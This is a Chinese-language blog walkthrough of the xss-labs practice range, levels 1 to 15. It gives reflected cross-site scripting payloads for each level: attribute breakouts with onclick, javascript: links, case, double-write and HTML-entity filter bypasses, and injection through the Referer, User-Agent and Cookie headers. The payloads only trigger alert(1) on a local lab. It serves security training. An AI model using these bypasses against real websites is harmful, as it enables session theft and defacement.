@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xss-labs | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="该死你怎么还活着? 老兄我们还在living-room里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs">
+<meta property="og:url" content="https://4reexile.github.io/article/xss-labs/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="该死你怎么还活着? 老兄我们还在living-room里">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-08-22T09:06:24.000Z">
+<meta property="article:modified_time" content="2025-07-26T14:36:12.925Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="HTML">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/xss-labs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss-labs',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-26 22:36:12'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xss-labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-22T09:06:24.000Z" title="Created 2024-08-22 17:06:24">2024-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.3k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>xss-labs</h1>
+<h2 id="level1"><a class="header-anchor" href="#level1">¶</a>level1</h2>
+<p>在url直接输入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level2"><a class="header-anchor" href="#level2">¶</a>level2</h2>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;搜索&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:4<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以从第五行处进行利用, 闭合前面的语句即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>本机上检查源码发现第三行利用的函数为<code>htmlspecialchars</code>, 很可惜没成</p>
+<p>还可以构造onclick属性, 因为是<code>&lt;input&gt;</code>标签</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level2.php?keyword=&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>此时文本框有了一个点击事件, 点击文本框就能看到弹窗进入下一关</p>
+<h2 id="level3"><a class="header-anchor" href="#level3">¶</a>level3</h2>
+<p><code>&lt;input&gt;</code>标签继续尝试:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level3.php?keyword=&#x27; onclick=&#x27;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<p>点击搜索框即可</p>
+<blockquote>
+<p>双引号被编码</p>
+</blockquote>
+<h2 id="level4"><a class="header-anchor" href="#level4">¶</a>level4</h2>
+<p>还是可以直接用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 点击搜索框</span><br><span class="line">level4.php?keyword=&quot; onclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br><span class="line"># 点击搜索</span><br><span class="line">level4.php?keyword=&#x27;&quot; onblur=&#x27;alert(1)&#x27;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<h2 id="level5"><a class="header-anchor" href="#level5">¶</a>level5</h2>
+<p>对事件on做了过滤, 同时过滤了script, 增加了_使得它们失效</p>
+<p>试试<code>&lt;a&gt;</code>标签, 发现是可以塞进去的, 只过滤了script</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level5.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(1);&#x27;&gt;cnm&lt;/a&gt;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<h2 id="level6"><a class="header-anchor" href="#level6">¶</a>level6</h2>
+<p>可以大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level6.php?keyword=&quot; Onclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br><span class="line">level6.php?keyword=&quot;&gt;&lt;a Href=&#x27;javascript:alert(1);&#x27;&gt;cnm&lt;/a&gt;&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<h2 id="level7"><a class="header-anchor" href="#level7">¶</a>level7</h2>
+<p>尝试利用下面的payload发现on被替换为空:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p>尝试双写, 成功绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level7.php?keyword=&quot; oonnclick=&quot;alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<h2 id="level8"><a class="header-anchor" href="#level8">¶</a>level8</h2>
+<p>内容输出在了a标签的href属性中, javascript不仅加了<code>_</code>, 并且将特殊符号进行了编码无法闭合</p>
+<p>但是属性值是可以进行编码绕过的, 进行一个html的实体编码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hex编码也可以</p>
+<p><code>javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)</code></p>
+</blockquote>
+<p>输入到输入框再点击友情链接即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level8.php?keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2334%3B%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B%26%2334%3B%26%2341%3B&amp;submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5</span><br></pre></td></tr></table></figure>
+<h2 id="level9"><a class="header-anchor" href="#level9">¶</a>level9</h2>
+<p><a target="_blank" rel="noopener" href="https://www.matools.com/code-convert-unicode">unicode编码</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>必须要有http://, 但是在最后增加会导致跳转不可用, 注释掉<a target="_blank" rel="noopener" href="http://xn--xft693h">http://就行</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure>
+<h2 id="level10"><a class="header-anchor" href="#level10">¶</a>level10</h2>
+<p>在源码可以找到三个传参点, 最后找到<code>t_sort</code>可以作为传参点, 传参在value</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>input标签进行注入可以闭合属性, 构造新的属性, 同时把type=&quot;hidden&quot;属性替换掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">level10.php?keyword=1&amp;t_sort=&#x27;&quot; type=&#x27;text&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="level11"><a class="header-anchor" href="#level11">¶</a>level11</h2>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;http://127.0.0.1:8903/level10.php?keyword=1&amp;t_sort=%27%22%20type=%27text%27%20onclick=%27alert(123)%27&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个<code>t_ref</code>是上一关跳转过来的referer, referer是没有过滤的</p>
+<p>所以将下面payload塞进referer然后取得输入框焦点即可:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;type=&#x27;text&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="level12"><a class="header-anchor" href="#level12">¶</a>level12</h2>
+<p><code>t_ua</code>没有被编码, 这次是User Agent, 换成上面的payload即可</p>
+<h2 id="level13"><a class="header-anchor" href="#level13">¶</a>level13</h2>
+<p>刷新页面抓包, 将Cookie改成上面的payload即可</p>
+<h2 id="level14"><a class="header-anchor" href="#level14">¶</a>level14</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40929683/article/details/120422266?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172425177016800182119154%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172425177016800182119154&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120422266-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=xss-labs%2014&amp;spm=1018.2226.3001.4187">大佬解析</a></p>
+<p>需要安装flash我认为可以直接拉倒</p>
+<p>反正就是上传一个包含xss的图片然后被解析出来</p>
+<h2 id="level15"><a class="header-anchor" href="#level15">¶</a>level15</h2>
+<p>跳转有问题, 我自己的网址是: <code>/level15.php?src=1.gif</code></p>
+<p>根据提示和官方文档, 发现可以包含页面, 尝试包含level1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8903/level15.php?src=%27http://127.0.0.1:8903/level1.php%27</span><br></pre></td></tr></table></figure>
+<p>利用level1的payload似乎被过滤了, 尝试后是<code>&lt;script&gt;</code></p>
+<p>尝试其他的, 发现可以利用以下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8903/level15.php?src=&#x27;level1.php?name=&lt;img src=123 οnerrοr=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>无法弹出弹窗, 拉倒了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/xss-labs/">https://4reexile.github.io/article/xss-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/HTML/">HTML</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-unserialize/" title="Web入门_反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_反序列化</div></div></a></div><div class="next-post pull-right"><a href="/article/ctfshow-webbasic-sql-4/" title="Web入门_sql注入_4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Web入门_sql注入_4</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/php/" title="PHP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-08</div><div class="title">PHP</div></div></a></div><div><a href="/article/rce/" title="RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-08</div><div class="title">RCE</div></div></a></div><div><a href="/article/sql-injection/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-24</div><div class="title">SQL注入</div></div></a></div><div><a href="/article/Stapler-1/" title="Stapler-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-28</div><div class="title">Stapler-1</div></div></a></div><div><a href="/article/ctfshow-webbasic-ssrf/" title="Web入门_SSRF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-02</div><div class="title">Web入门_SSRF</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">xss-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">1.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">1.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">1.4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">1.5.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6"><span class="toc-number">1.6.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7"><span class="toc-number">1.7.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8"><span class="toc-number">1.8.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9"><span class="toc-number">1.9.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-number">1.10.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-number">1.11.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level12"><span class="toc-number">1.12.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level13"><span class="toc-number">1.13.</span> <span class="toc-text">level13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level14"><span class="toc-number">1.14.</span> <span class="toc-text">level14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level15"><span class="toc-number">1.15.</span> <span class="toc-text">level15</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div 